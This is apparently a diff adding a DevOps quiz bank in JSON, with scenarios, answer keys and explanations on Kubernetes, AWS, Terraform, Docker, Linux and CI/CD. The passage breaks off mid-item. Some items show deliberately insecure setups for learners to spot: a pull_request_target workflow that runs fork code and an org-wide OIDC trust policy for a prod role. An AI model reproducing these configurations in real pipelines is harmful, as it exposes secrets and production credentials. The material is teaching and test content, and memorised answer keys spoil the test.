@@ -1,0 +1,2742 @@
+[
+ {
+  "id": "m-k8s-001",
+  "category": "Kubernetes",
+  "type": "mcq",
+  "title": "The pod that keeps restarting",
+  "scenario": "A new release of `payments-api` went out 10 minutes ago. Grafana shows the error rate climbing and on-call pulls this from the cluster.",
+  "context": [
+   {
+    "kind": "terminal",
+    "title": "bastion",
+    "content": "$ kubectl get pods -n payments\nNAME                            READY   STATUS             RESTARTS      AGE\npayments-api-6c9f7d8b5-2xkqp    0/1     CrashLoopBackOff   6 (32s ago)   9m\npayments-api-6c9f7d8b5-h7r4m    0/1     CrashLoopBackOff   6 (41s ago)   9m\npayments-api-5b7d9c4f8-lq2zt    1/1     Running            0             3d\n"
+   }
+  ],
+  "question": "What is the most useful next command to find the root cause?",
+  "options": [
+   "`kubectl logs payments-api-6c9f7d8b5-2xkqp -n payments --previous`",
+   "`kubectl delete pod payments-api-6c9f7d8b5-2xkqp -n payments`",
+   "`kubectl get nodes`",
+   "`kubectl scale deploy payments-api --replicas=10 -n payments`"
+  ],
+  "answer": 0,
+  "explanation": "In CrashLoopBackOff the current container may have only just restarted, so `--previous` (`-p`) shows the logs of the instance that crashed. Deleting or scaling only treats the symptom. The old ReplicaSet Pod still running tells you the rollout stalled, which is good — maxUnavailable did its job.",
+  "level": "medium"
+ },
+ {
+  "id": "m-k8s-002",
+  "category": "Kubernetes",
+  "type": "mcq",
+  "title": "Exit code 137",
+  "scenario": "A Java service restarts every few hours under load.",
+  "context": [
+   {
+    "kind": "terminal",
+    "title": "describe",
+    "content": "$ kubectl describe pod orders-7f8d9-abcde | sed -n '/Last State/,/Restart/p'\n    Last State:     Terminated\n      Reason:       OOMKilled\n      Exit Code:    137\n      Started:      Mon, 16 Nov 2026 09:12:03 +0400\n      Finished:     Mon, 16 Nov 2026 11:47:55 +0400\n    Ready:          True\n    Restart Count:  4\n$ kubectl get pod orders-7f8d9-abcde -o jsonpath='{.spec.containers[0].resources}'\n{\"limits\":{\"memory\":\"512Mi\"},\"requests\":{\"cpu\":\"250m\",\"memory\":\"512Mi\"}}\n"
+   }
+  ],
+  "question": "What is the best fix?",
+  "options": [
+   "Raise the memory limit to fit the real working set (and size the JVM heap with `-XX:MaxRAMPercentage`), based on observed usage",
+   "Add a CPU limit so the container uses less memory",
+   "Switch the restartPolicy to Never",
+   "Increase the liveness probe timeout"
+  ],
+  "answer": 0,
+  "explanation": "137 = 128 + 9 (SIGKILL), and `OOMKilled` confirms the kernel cgroup OOM killer fired at the 512Mi limit. Right-size from real usage (e.g. VPA recommendations or a tool like PodGauge), and make the JVM container-aware so heap + metaspace + threads fit under the limit. CPU limits don't affect memory.",
+  "level": "medium"
+ },
+ {
+  "id": "m-k8s-003",
+  "category": "Kubernetes",
+  "type": "mcq",
+  "title": "Pending forever",
+  "context": [
+   {
+    "kind": "terminal",
+    "title": "events",
+    "content": "$ kubectl describe pod ml-worker-0 | tail -4\nEvents:\n  Type     Reason            Age   From               Message\n  ----     ------            ----  ----               -------\n  Warning  FailedScheduling  2m    default-scheduler  0/6 nodes are available: 3 Insufficient cpu, 3 node(s) had untolerated taint {dedicated: gpu}. preemption: 0/6 nodes are available: 6 No preemption victims found for incoming pod.\n"
+   }
+  ],
+  "question": "The Pod is a CPU workload and should NOT run on GPU nodes. What is the correct fix?",
+  "options": [
+   "Add a toleration for `dedicated=gpu` to the Pod",
+   "Lower the Pod's CPU request to what it really needs, or add CPU capacity (e.g. let Karpenter provision a node)",
+   "Remove the taint from the GPU nodes",
+   "Delete and recreate the Pod"
+  ],
+  "answer": 1,
+  "explanation": "Three nodes are excluded by the taint, which is correct here, and the other three lack CPU. Fix the request or add capacity. Tolerating or removing the taint would put CPU work on expensive GPU nodes.",
+  "level": "medium"
+ },
+ {
+  "id": "m-k8s-004",
+  "category": "Kubernetes",
+  "type": "mcq",
+  "title": "Service with no endpoints",
+  "scenario": "Users get `503` from the ingress. The Pods are Running and Ready.",
+  "context": [
+   {
+    "kind": "terminal",
+    "title": "bastion",
+    "content": "$ kubectl get endpointslices -l kubernetes.io/service-name=web\nNAME        ADDRESSTYPE   PORTS     ENDPOINTS   AGE\nweb-8sdk2   IPv4          <unset>   <unset>     20m\n$ kubectl get svc web -o jsonpath='{.spec.selector}'\n{\"app\":\"web\"}\n$ kubectl get pods --show-labels | grep web\nweb-5d4b7c9f6-x2v9q   1/1   Running   0   20m   app.kubernetes.io/name=web,pod-template-hash=5d4b7c9f6\n"
+   }
+  ],
+  "question": "Why does the Service have no endpoints?",
+  "options": [
+   "The Pods are not Ready",
+   "The Service selector `app=web` doesn't match the Pod label `app.kubernetes.io/name=web`",
+   "kube-proxy is down",
+   "The Service type must be LoadBalancer"
+  ],
+  "answer": 1,
+  "explanation": "A Service selects Pods by label. After a chart was migrated to the recommended `app.kubernetes.io/*` labels, the Service still selects `app=web`. Align the selector (and remember that a Deployment's selector is immutable).",
+  "level": "medium"
+ },
+ {
+  "id": "m-k8s-005",
+  "category": "Kubernetes",
+  "type": "multi",
+  "title": "Safe node drain",
+  "scenario": "You need to drain a node for an AMI upgrade with zero customer impact.",
+  "question": "Which of these help ensure the drain does not cause downtime? (select all)",
+  "options": [
+   "A PodDisruptionBudget for each critical workload",
+   "At least 2 replicas spread across nodes/zones (topologySpreadConstraints)",
+   "Readiness probes so new Pods receive traffic only when ready",
+   "`kubectl drain --disable-eviction --force` to speed it up"
+  ],
+  "answer": [
+   0,
+   1,
+   2
+  ],
+  "explanation": "PDBs throttle evictions, spread replicas so one node never holds them all, and readiness gates traffic. `--disable-eviction` bypasses PDBs by deleting Pods directly — the opposite of safe.",
+  "level": "medium"
+ },
+ {
+  "id": "m-k8s-006",
+  "category": "Kubernetes",
+  "type": "mcq",
+  "title": "ImagePullBackOff on EKS",
+  "context": [
+   {
+    "kind": "log",
+    "title": "events",
+    "content": "Warning  Failed   12s  kubelet  Failed to pull image \"123456789012.dkr.ecr.eu-central-1.amazonaws.com/api:1.8.2\": rpc error: code = NotFound desc = failed to pull and unpack image: not found\n"
+   }
+  ],
+  "question": "What is the most likely cause?",
+  "options": [
+   "The node IAM role lacks ECR permissions",
+   "The tag `1.8.2` doesn't exist in that repository/region (pipeline pushed a different tag or region)",
+   "The cluster is out of disk",
+   "The image is too large"
+  ],
+  "answer": 1,
+  "explanation": "`NotFound` means the registry answered and the manifest doesn't exist. An IAM problem shows up as `403 Forbidden` / `no basic auth credentials`. Check `aws ecr describe-images --repository-name api --image-ids imageTag=1.8.2 --region eu-central-1`.",
+  "level": "medium"
+ },
+ {
+  "id": "m-k8s-007",
+  "category": "Kubernetes",
+  "type": "spot",
+  "title": "Rollout that never finishes",
+  "scenario": "`kubectl rollout status` hangs, and new Pods are Running but never Ready. The app listens on port 8080 and serves health checks at `/healthz`.",
+  "lang": "yaml",
+  "code": "containers:\n  - name: api\n    image: ghcr.io/acme/api:2.4.0\n    ports:\n      - containerPort: 8080\n    readinessProbe:\n      httpGet:\n        path: /healthz\n        port: 80\n      periodSeconds: 5\n",
+  "answer": [
+   9
+  ],
+  "explanation": "The probe targets port 80, but the app listens on 8080, so readiness never passes and the rollout stalls (and the old ReplicaSet keeps serving, thanks to maxUnavailable). Use `port: 8080` or a named port such as `port: http`.",
+  "level": "medium"
+ },
+ {
+  "id": "m-k8s-008",
+  "category": "Kubernetes",
+  "type": "mcq",
+  "title": "HPA shows <unknown>",
+  "context": [
+   {
+    "kind": "terminal",
+    "title": "bastion",
+    "content": "$ kubectl get hpa api\nNAME   REFERENCE        TARGETS              MINPODS   MAXPODS   REPLICAS\napi    Deployment/api   cpu: <unknown>/70%   2         10        2\n"
+   }
+  ],
+  "question": "What are the two most common reasons for `<unknown>` CPU targets?",
+  "options": [
+   "metrics-server not installed/healthy, or the containers have no CPU requests",
+   "The HPA needs a LoadBalancer Service",
+   "maxReplicas is too low",
+   "The Deployment uses a ConfigMap"
+  ],
+  "answer": 0,
+  "explanation": "CPU utilisation is a percentage of the request, so without `resources.requests.cpu` there's nothing to divide by. Without metrics-server (`kubectl top pods` fails), there's no data at all.",
+  "level": "medium"
+ },
+ {
+  "id": "m-aws-001",
+  "category": "AWS",
+  "type": "mcq",
+  "title": "AccessDenied with an explicit deny",
+  "context": [
+   {
+    "kind": "log",
+    "title": "CLI",
+    "content": "An error occurred (AccessDenied) when calling the PutObject operation: User: arn:aws:sts::111122223333:assumed-role/ci-deploy/gha-1731744000 is not authorized to perform: s3:PutObject on resource: \"arn:aws:s3:::acme-artifacts/build/app.zip\" with an explicit deny in a service control policy\n"
+   }
+  ],
+  "question": "The role's IAM policy allows `s3:PutObject` on the bucket. Where must you look to fix this?",
+  "options": [
+   "The bucket ACL",
+   "The Organizations SCP attached to the account/OU",
+   "The KMS key policy",
+   "The role's trust policy"
+  ],
+  "answer": 1,
+  "explanation": "The message names the source, an explicit deny in an SCP. An explicit deny anywhere (SCP, permission boundary, resource policy, identity policy) beats any allow. Common SCPs deny actions outside approved regions or without required tags or encryption headers.",
+  "level": "medium"
+ },
+ {
+  "id": "m-aws-002",
+  "category": "AWS",
+  "type": "mcq",
+  "title": "Private subnet can't reach the internet",
+  "scenario": "An EC2 instance in a private subnet can't `curl https://api.github.com`. Security groups allow all egress.",
+  "context": [
+   {
+    "kind": "terminal",
+    "title": "route table",
+    "content": "$ aws ec2 describe-route-tables --route-table-ids rtb-0priv --query 'RouteTables[].Routes'\n[\n    { \"DestinationCidrBlock\": \"10.20.0.0/16\", \"GatewayId\": \"local\", \"State\": \"active\" },\n    { \"DestinationCidrBlock\": \"0.0.0.0/0\", \"NatGatewayId\": \"nat-0abc\", \"State\": \"blackhole\" }\n]\n"
+   }
+  ],
+  "question": "What does `blackhole` indicate?",
+  "options": [
+   "The NAT Gateway the route points to was deleted (or failed) — traffic is dropped",
+   "The route is working but slow",
+   "DNS resolution is disabled",
+   "The NACL is blocking port 443"
+  ],
+  "answer": 0,
+  "explanation": "A blackhole route means its target no longer exists. Recreate the NAT Gateway (one per AZ for HA) and update the route, or use VPC endpoints for AWS services.",
+  "level": "medium"
+ },
+ {
+  "id": "m-aws-003",
+  "category": "AWS",
+  "type": "multi",
+  "title": "Cut the NAT Gateway bill",
+  "scenario": "Cost Explorer shows NAT Gateway data processing as the #2 line item. Most traffic is EKS nodes pulling images from ECR and writing to S3.",
+  "question": "Which actions reduce that cost? (select all)",
+  "options": [
+   "Add an S3 gateway VPC endpoint",
+   "Add ECR API/DKR interface endpoints (plus S3 gateway endpoint for layer storage)",
+   "Move all nodes to public subnets with public IPs",
+   "Enable pull-through cache and reduce image size with multi-stage builds"
+  ],
+  "answer": [
+   0,
+   1,
+   3
+  ],
+  "explanation": "The S3 gateway endpoint is free, ECR layers are served from S3, and interface endpoints cost far less per GB than NAT processing. Smaller images mean fewer bytes. Public nodes would technically avoid NAT but go against basic security posture.",
+  "level": "medium"
+ },
+ {
+  "id": "m-aws-004",
+  "category": "AWS",
+  "type": "mcq",
+  "title": "ALB 502s after deploy",
+  "context": [
+   {
+    "kind": "log",
+    "title": "ALB access log",
+    "content": "https 2026-11-16T07:02:11Z app/prod-alb/... 10.0.3.41:51234 10.0.12.7:8080 0.001 -1 -1 502 - 412 0 \"GET https://api.acme.io:443/v1/orders HTTP/2.0\" ... \"-\" \"-\" 0 2026-11-16T07:02:11Z \"forward\" \"-\" \"-\" \"10.0.12.7:8080\" \"-\" \"-\" \"-\" TargetConnectionError\n"
+   }
+  ],
+  "question": "Target response time is `-1` and the reason is `TargetConnectionError`. What's most likely?",
+  "options": [
+   "The ALB couldn't open a TCP connection to the target (app not listening yet, wrong port, or SG blocks the ALB)",
+   "The app returned a 502 itself",
+   "TLS certificate expired on the ALB",
+   "WAF blocked the request"
+  ],
+  "answer": 0,
+  "explanation": "`-1` means no response was received. Typical causes are targets registered before the app listens (a missing readiness/health check), a container port mismatch, or the target SG not allowing the ALB SG.",
+  "level": "medium"
+ },
+ {
+  "id": "m-aws-005",
+  "category": "AWS",
+  "type": "mcq",
+  "title": "Lambda timeouts in a VPC",
+  "scenario": "A Lambda inside a VPC (private subnets) times out calling Secrets Manager. Outside the VPC it worked.",
+  "question": "What's the cleanest fix?",
+  "options": [
+   "Increase the Lambda timeout to 15 minutes",
+   "Add a Secrets Manager interface VPC endpoint (or NAT) so the function can reach the API privately",
+   "Give the Lambda a public IP",
+   "Move the secret to an environment variable in plaintext"
+  ],
+  "answer": 1,
+  "explanation": "VPC-attached Lambdas have no internet path and can't get public IPs. Use interface endpoints (PrivateLink) for AWS APIs, or route through NAT. Never put plaintext secrets in env vars.",
+  "level": "medium"
+ },
+ {
+  "id": "m-aws-006",
+  "category": "AWS",
+  "type": "mcq",
+  "title": "GuardDuty finding",
+  "context": [
+   {
+    "kind": "json",
+    "title": "finding",
+    "content": "{\n  \"Type\": \"UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS\",\n  \"Severity\": 8,\n  \"Resource\": { \"AccessKeyDetails\": { \"UserName\": \"web-ec2-role\" } },\n  \"Service\": { \"Action\": { \"AwsApiCallAction\": { \"Api\": \"ListBuckets\", \"RemoteIpDetails\": { \"IpAddressV4\": \"185.220.101.4\" } } } }\n}\n"
+   }
+  ],
+  "question": "What is the best FIRST containment step?",
+  "options": [
+   "Revoke the role's active sessions (deny by `aws:TokenIssueTime`) and enforce IMDSv2 on the instance",
+   "Delete the EC2 instance immediately",
+   "Disable GuardDuty to stop the alerts",
+   "Rotate the root account password"
+  ],
+  "answer": 0,
+  "explanation": "Instance-role credentials are being used outside AWS, which typically means SSRF against IMDSv1. Revoke sessions issued before now (the IAM console's 'Revoke active sessions' does this), require IMDSv2, then investigate. Snapshot before terminating anything — that's evidence.",
+  "level": "medium"
+ },
+ {
+  "id": "m-tf-001",
+  "category": "Terraform",
+  "type": "mcq",
+  "title": "State lock stuck",
+  "context": [
+   {
+    "kind": "terminal",
+    "title": "pipeline",
+    "content": "$ terraform plan\n╷\n│ Error: Error acquiring the state lock\n│\n│ Lock Info:\n│   ID:        7d1c2f3a-9b2e-4c1d-a5f0-3e8b9d7c6a21\n│   Path:      acme-tfstate/prod/network.tfstate\n│   Operation: OperationTypeApply\n│   Who:       runner@gha-runner-42\n│   Created:   2026-11-16 03:11:09 UTC\n"
+   }
+  ],
+  "question": "The runner that created the lock was cancelled hours ago. What should you do?",
+  "options": [
+   "Confirm no apply is running, then `terraform force-unlock 7d1c2f3a-9b2e-4c1d-a5f0-3e8b9d7c6a21`",
+   "Delete the state file and re-apply",
+   "Run `terraform apply -lock=false` on every pipeline from now on",
+   "Recreate the S3 bucket"
+  ],
+  "answer": 0,
+  "explanation": "Locks protect state from concurrent writes. Once you've verified that nobody is mid-apply, `force-unlock` with the lock ID is the documented fix. Disabling locking permanently invites state corruption.",
+  "level": "medium"
+ },
+ {
+  "id": "m-tf-002",
+  "category": "Terraform",
+  "type": "mcq",
+  "title": "Plan wants to replace the database",
+  "context": [
+   {
+    "kind": "diff",
+    "title": "plan",
+    "content": "# aws_db_instance.main must be replaced\n-/+ resource \"aws_db_instance\" \"main\" {\n      ~ identifier = \"prod-db\" -> \"prod-postgres\" # forces replacement\n        ...\n    }\nPlan: 1 to add, 0 to change, 1 to destroy.\n"
+   }
+  ],
+  "question": "Someone renamed the identifier for \"consistency\". What's the right response?",
+  "options": [
+   "Revert the identifier change (and add `lifecycle { prevent_destroy = true }` to critical data stores)",
+   "Apply — RDS will migrate data automatically",
+   "Run `terraform state rm` first",
+   "Use `-target` to apply only the DB"
+  ],
+  "answer": 0,
+  "explanation": "Some arguments force replacement, and replacing a database destroys its data. Read every `-/+` in a plan. `prevent_destroy` makes Terraform error out instead. A `moved` block won't help, because the resource address didn't change — the argument did.",
+  "level": "medium"
+ },
+ {
+  "id": "m-tf-003",
+  "category": "Terraform",
+  "type": "multi",
+  "title": "Remote state done right",
+  "question": "Which are good practices for Terraform state in a team? (select all)",
+  "options": [
+   "Remote backend (e.g. S3) with versioning and encryption enabled",
+   "State locking (S3 `use_lockfile` or DynamoDB)",
+   "Commit terraform.tfstate to Git so everyone has it",
+   "Split state per environment/component to reduce blast radius"
+  ],
+  "answer": [
+   0,
+   1,
+   3
+  ],
+  "explanation": "State often contains secrets and must never be in Git. Use a versioned, encrypted remote backend with locking, and separate states for prod and dev and for network, data and apps.",
+  "level": "medium"
+ },
+ {
+  "id": "m-tf-004",
+  "category": "Terraform",
+  "type": "mcq",
+  "title": "for_each vs count",
+  "scenario": "You created 3 subnets with `count = length(var.azs)`. Removing the first AZ from the list makes Terraform want to destroy and recreate two subnets.",
+  "question": "How do you avoid this index-shift problem?",
+  "options": [
+   "Use `for_each` over a map/set keyed by AZ so each subnet has a stable address",
+   "Use `depends_on`",
+   "Add `ignore_changes = all`",
+   "Pin the provider version"
+  ],
+  "answer": 0,
+  "explanation": "`count` addresses resources by index ([0], [1], …), so removing one shifts the rest. `for_each` keys (e.g. `aws_subnet.private[\"eu-central-1a\"]`) stay stable. Migrate the existing ones with `moved` blocks.",
+  "level": "medium"
+ },
+ {
+  "id": "m-docker-001",
+  "category": "Docker",
+  "type": "spot",
+  "title": "Image is 1.4 GB",
+  "scenario": "The Go service's image is huge and the scanner reports 300+ CVEs. Which line is the root cause?",
+  "lang": "dockerfile",
+  "code": "FROM golang:1.23\nWORKDIR /src\nCOPY go.mod go.sum ./\nRUN go mod download\nCOPY . .\nRUN CGO_ENABLED=0 go build -o /app ./cmd/api\nEXPOSE 8080\nCMD [\"/app\"]\n",
+  "answer": [
+   1
+  ],
+  "explanation": "The final image is the full Go toolchain image. Add a second stage — `FROM gcr.io/distroless/static-debian12` + `COPY --from=build /app /app` + `USER nonroot` — and the image shrinks to ~15 MB with almost no CVEs.",
+  "level": "medium"
+ },
+ {
+  "id": "m-docker-002",
+  "category": "Docker",
+  "type": "mcq",
+  "title": "Cache busts on every build",
+  "context": [
+   {
+    "kind": "dockerfile",
+    "title": "Dockerfile",
+    "content": "FROM node:22-alpine\nWORKDIR /app\nCOPY . .\nRUN npm ci\nRUN npm run build\nCMD [\"node\",\"dist/server.js\"]\n"
+   }
+  ],
+  "question": "Every code change re-runs `npm ci` (3 min). Best fix?",
+  "options": [
+   "Copy `package.json` and `package-lock.json` first, run `npm ci`, then `COPY . .`",
+   "Use `npm install` instead of `npm ci`",
+   "Add `--no-cache` to docker build",
+   "Switch to `node:latest`"
+  ],
+  "answer": 0,
+  "explanation": "Layers are cached until an input changes. Copying only the lockfiles first means dependencies are reinstalled only when they change. Also add `.dockerignore` (node_modules, .git) and consider `RUN --mount=type=cache,target=/root/.npm`.",
+  "level": "medium"
+ },
+ {
+  "id": "m-docker-003",
+  "category": "Docker",
+  "type": "mcq",
+  "title": "Container ignores SIGTERM",
+  "scenario": "Pods take the full 30s `terminationGracePeriodSeconds` to stop, dropping in-flight requests.",
+  "context": [
+   {
+    "kind": "dockerfile",
+    "title": "Dockerfile (tail)",
+    "content": "CMD sh -c \"python manage.py migrate && gunicorn app.wsgi -b 0.0.0.0:8000\"\n"
+   }
+  ],
+  "question": "Why doesn't the app shut down gracefully?",
+  "options": [
+   "The shell form makes `sh` PID 1; it doesn't forward SIGTERM to gunicorn",
+   "gunicorn doesn't support SIGTERM",
+   "Port 8000 is privileged",
+   "The image lacks bash"
+  ],
+  "answer": 0,
+  "explanation": "With `sh -c`, PID 1 is the shell, which doesn't forward signals. Use exec form, `exec gunicorn ...` inside the script, or an init such as tini (`--init`). Run migrations in a Job or initContainer, not on every Pod start.",
+  "level": "medium"
+ },
+ {
+  "id": "m-linux-001",
+  "category": "Linux",
+  "type": "mcq",
+  "title": "Disk full but du disagrees",
+  "context": [
+   {
+    "kind": "terminal",
+    "title": "server",
+    "content": "$ df -h /var\nFilesystem      Size  Used Avail Use% Mounted on\n/dev/nvme1n1    50G   50G     0 100% /var\n$ sudo du -sh /var\n12G     /var\n$ sudo lsof +L1 | head -3\nCOMMAND   PID USER  FD  TYPE DEVICE   SIZE/OFF NLINK  NODE NAME\njava     2211 app   45w  REG  259,1 40265318400     0  1311 /var/log/app/app.log (deleted)\n"
+   }
+  ],
+  "question": "What explains the gap and how do you free space without data loss?",
+  "options": [
+   "A deleted log file is still held open by PID 2211; restart/reload the app (or truncate via `/proc/2211/fd/45`)",
+   "The filesystem is corrupted; run fsck now",
+   "du doesn't count hidden files",
+   "Inodes are exhausted"
+  ],
+  "answer": 0,
+  "explanation": "Space isn't freed until every open file descriptor is closed. Someone `rm`'d a 40 GB log the app still writes to. Truncate via `: > /proc/2211/fd/45` or restart the app, then fix logrotate (`copytruncate` or a reopen signal).",
+  "level": "medium"
+ },
+ {
+  "id": "m-linux-002",
+  "category": "Linux",
+  "type": "mcq",
+  "title": "High load, idle CPU",
+  "context": [
+   {
+    "kind": "terminal",
+    "title": "top",
+    "content": "$ uptime\n 10:42:01 up 12 days,  3:11,  1 user,  load average: 18.32, 17.90, 15.11\n$ vmstat 1 3\nprocs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----\n r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st\n 1 17      0 812344  10232 4123344   0    0   120 48211 1800 2100  3  2 10 85  0\n"
+   }
+  ],
+  "question": "Load is 18 on a 4-vCPU box but CPU is mostly idle. What's going on?",
+  "options": [
+   "Processes are blocked on I/O (b=17, wa=85%) — check the disk/EBS volume (iostat -x, burst balance)",
+   "CPU is saturated",
+   "The system is swapping heavily",
+   "Too many network interrupts"
+  ],
+  "answer": 0,
+  "explanation": "Linux load counts tasks in uninterruptible (D-state) I/O waits. The high `wa` and `b` columns point to storage — e.g. a gp2 volume out of burst credits, or EBS throughput limits. Moving to gp3 with provisioned IOPS/throughput is a common fix.",
+  "level": "medium"
+ },
+ {
+  "id": "m-linux-003",
+  "category": "Linux",
+  "type": "mcq",
+  "title": "Service won't start",
+  "context": [
+   {
+    "kind": "terminal",
+    "title": "server",
+    "content": "$ systemctl status api\n× api.service - Acme API\n     Loaded: loaded (/etc/systemd/system/api.service; enabled)\n     Active: failed (Result: exit-code) since Mon 2026-11-16 10:01:22 +04\n    Process: 9812 ExecStart=/opt/api/bin/api (code=exited, status=203/EXEC)\n"
+   }
+  ],
+  "question": "What does `status=203/EXEC` usually mean?",
+  "options": [
+   "systemd couldn't execute the binary — wrong path, missing execute bit, wrong architecture, or bad shebang",
+   "The app crashed with a segfault",
+   "The port is already in use",
+   "The unit file has a syntax error"
+  ],
+  "answer": 0,
+  "explanation": "203/EXEC fails before your program runs. Check `ls -l /opt/api/bin/api`, `file` (an amd64 vs arm64 mismatch after moving to Graviton is a classic), and SELinux contexts. `journalctl -u api -b` shows the details.",
+  "level": "medium"
+ },
+ {
+  "id": "m-cicd-001",
+  "category": "CI/CD",
+  "type": "spot",
+  "title": "Workflow leaks power",
+  "scenario": "This workflow runs on every PR, including PRs from forks. Which **two** lines together create a critical vulnerability?",
+  "lang": "yaml",
+  "code": "name: pr-check\non:\n  pull_request_target:\n    types: [opened, synchronize]\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: npm ci && npm test\n",
+  "answer": [
+   3,
+   13
+  ],
+  "explanation": "`pull_request_target` runs in the base repo's context, with secrets and a write-capable token. Checking out the fork's head SHA and running `npm ci && npm test` executes untrusted code with those privileges (a \"pwn request\"). Use `pull_request` for untrusted code, or never check out the PR head in `pull_request_target`.",
+  "level": "medium"
+ },
+ {
+  "id": "m-cicd-002",
+  "category": "CI/CD",
+  "type": "mcq",
+  "title": "OIDC trust too wide",
+  "context": [
+   {
+    "kind": "json",
+    "title": "trust policy",
+    "content": "{\n  \"Effect\": \"Allow\",\n  \"Principal\": { \"Federated\": \"arn:aws:iam::111122223333:oidc-provider/token.actions.githubusercontent.com\" },\n  \"Action\": \"sts:AssumeRoleWithWebIdentity\",\n  \"Condition\": {\n    \"StringEquals\": { \"token.actions.githubusercontent.com:aud\": \"sts.amazonaws.com\" },\n    \"StringLike\":   { \"token.actions.githubusercontent.com:sub\": \"repo:acme/*\" }\n  }\n}\n"
+   }
+  ],
+  "question": "This role can deploy to production. What's the risk?",
+  "options": [
+   "Any repo, branch or PR in the `acme` org can assume the prod role — restrict `sub` to e.g. `repo:acme/infra:environment:prod`",
+   "The audience should be `github.com`",
+   "OIDC providers can't be used for production",
+   "StringLike is not a valid operator"
+  ],
+  "answer": 0,
+  "explanation": "The `sub` claim encodes repo plus ref or environment. Wildcarding the whole org lets any workflow in any repo (feature branches included) get prod credentials. Pin it to the specific repo and a protected environment or branch.",
+  "level": "medium"
+ },
+ {
+  "id": "m-cicd-003",
+  "category": "CI/CD",
+  "type": "order",
+  "title": "A sane deployment pipeline",
+  "question": "Order the stages of a typical secure container pipeline for a merge to main.",
+  "items": [
+   "Lint, unit tests and SAST",
+   "Build the image (multi-stage) and generate an SBOM",
+   "Scan the image for CVEs and fail on HIGH/CRITICAL",
+   "Sign the image (cosign) and push by digest",
+   "Update the GitOps repo with the new digest (Argo CD syncs)"
+  ],
+  "explanation": "Test cheap things first (shift-left), build once, scan before you trust it, sign what passed, and let GitOps deploy the immutable digest — never a mutable tag.",
+  "level": "medium"
+ },
+ {
+  "id": "m-git-001",
+  "category": "Git",
+  "type": "mcq",
+  "title": "Secret pushed to GitHub",
+  "scenario": "A developer pushed an AWS access key in a commit to a public repo 5 minutes ago.",
+  "question": "What is the correct FIRST action?",
+  "options": [
+   "Deactivate/rotate the key in IAM immediately, then check CloudTrail for its usage",
+   "Force-push a commit that removes the line",
+   "Make the repo private",
+   "Run `git filter-repo` and hope nobody saw it"
+  ],
+  "answer": 0,
+  "explanation": "Bots scrape public pushes within seconds, so assume the key is compromised. Revoke it first, then investigate and clean history. Prevention means push protection, secret scanning, gitleaks pre-commit hooks, and OIDC instead of static keys.",
+  "level": "medium"
+ },
+ {
+  "id": "m-git-002",
+  "category": "Git",
+  "type": "mcq",
+  "title": "Detached HEAD work",
+  "context": [
+   {
+    "kind": "terminal",
+    "title": "laptop",
+    "content": "$ git status\nHEAD detached at 4f2a9c1\nnothing to commit, working tree clean\n$ git log --oneline -2\na91be03 (HEAD) fix: retry on 429\n4f2a9c1 (tag: v2.3.0) release 2.3.0\n"
+   }
+  ],
+  "question": "You committed a fix while detached. How do you keep it?",
+  "options": [
+   "`git switch -c fix/retry-429` to create a branch at the current commit",
+   "`git checkout main` — the commit is saved automatically",
+   "`git reset --hard v2.3.0`",
+   "`git stash`"
+  ],
+  "answer": 0,
+  "explanation": "The commit only lives under HEAD. Leaving without a branch makes it reachable only through the reflog until garbage collection. Create a branch now, then open a PR or cherry-pick.",
+  "level": "medium"
+ },
+ {
+  "id": "m-net-001",
+  "category": "Networking",
+  "type": "mcq",
+  "title": "DNS works, TLS fails",
+  "context": [
+   {
+    "kind": "terminal",
+    "title": "pod",
+    "content": "$ curl -sv https://payments.partner.io/health 2>&1 | grep -E 'Connected|SSL|certificate'\n* Connected to payments.partner.io (52.28.10.4) port 443\n* SSL certificate problem: unable to get local issuer certificate\n"
+   }
+  ],
+  "question": "It works from your laptop but fails from the new distroless container. Why?",
+  "options": [
+   "The image has no CA certificate bundle (or the partner sends an incomplete chain your laptop tolerates)",
+   "The DNS record is wrong",
+   "Port 443 is blocked by the NACL",
+   "HTTP/2 is not supported"
+  ],
+  "answer": 0,
+  "explanation": "The TCP connection succeeded, so this is trust validation. Minimal images may lack `/etc/ssl/certs` — use a base image with ca-certificates. Also check that the server sends intermediates (`openssl s_client -showcerts`); browsers cache intermediates, CLIs don't.",
+  "level": "medium"
+ },
+ {
+  "id": "m-net-002",
+  "category": "Networking",
+  "type": "mcq",
+  "title": "Overlapping CIDRs",
+  "scenario": "You must peer the new `prod-eu` VPC with the shared-services VPC and connect on-prem via Transit Gateway.",
+  "context": [
+   {
+    "kind": "text",
+    "title": "CIDRs",
+    "content": "shared-services   10.0.0.0/16\non-prem           10.0.0.0/12\nprod-eu (planned) 10.20.0.0/16\n"
+   }
+  ],
+  "question": "What's the problem?",
+  "options": [
+   "On-prem 10.0.0.0/12 (10.0–10.15.x.x) overlaps shared-services 10.0.0.0/16 — routing will be ambiguous",
+   "/16 is too small for a VPC",
+   "prod-eu overlaps on-prem",
+   "Transit Gateway can't route 10.x ranges"
+  ],
+  "answer": 0,
+  "explanation": "10.0.0.0/12 covers 10.0.0.0–10.15.255.255, which contains shared-services. prod-eu (10.20/16) is outside it. Plan an IPAM (AWS VPC IPAM) before building — re-addressing later is painful.",
+  "level": "medium"
+ },
+ {
+  "id": "m-sec-001",
+  "category": "Security",
+  "type": "multi",
+  "title": "Harden this Pod",
+  "scenario": "Security asks you to bring a workload up to the Kubernetes Pod Security Standards `restricted` profile.",
+  "question": "Which settings are required or recommended? (select all)",
+  "options": [
+   "`runAsNonRoot: true`",
+   "`allowPrivilegeEscalation: false`",
+   "`capabilities: { drop: [\"ALL\"] }`",
+   "`hostNetwork: true`",
+   "`seccompProfile: { type: RuntimeDefault }`"
+  ],
+  "answer": [
+   0,
+   1,
+   2,
+   4
+  ],
+  "explanation": "The restricted profile requires non-root, no privilege escalation, dropping all capabilities, and the RuntimeDefault (or Localhost) seccomp profile. hostNetwork is forbidden even at the baseline level. Enforce it with the label `pod-security.kubernetes.io/enforce=restricted`.",
+  "level": "medium"
+ },
+ {
+  "id": "m-sec-002",
+  "category": "Security",
+  "type": "mcq",
+  "title": "Secrets in Kubernetes",
+  "scenario": "An auditor (PCI DSS) asks how database passwords in your EKS cluster are protected.",
+  "question": "Which setup best answers them?",
+  "options": [
+   "Secrets live in AWS Secrets Manager, synced via External Secrets Operator; EKS envelope encryption with KMS; RBAC restricts `get secrets`",
